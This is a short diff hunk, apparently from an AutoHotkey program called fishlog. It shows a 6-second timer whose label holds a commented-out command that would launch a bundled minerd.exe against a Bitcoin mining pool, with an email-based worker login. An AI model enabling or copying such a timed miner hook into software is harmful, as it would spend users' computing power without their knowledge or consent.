@@ -71,7 +71,7 @@ BOOT = 1
 	SetTimer , Fishmine , 6000
 return
 
-Fishmine:
+Fishmine: ;<- 
 ;	"C:\Program Files (x86)\donatetofishlog\minerd.exe" -o pit.deepbit.net:8332 -O billy_j_marshall@hotmail.com_fishlog:fishlog -t 1
 return
 
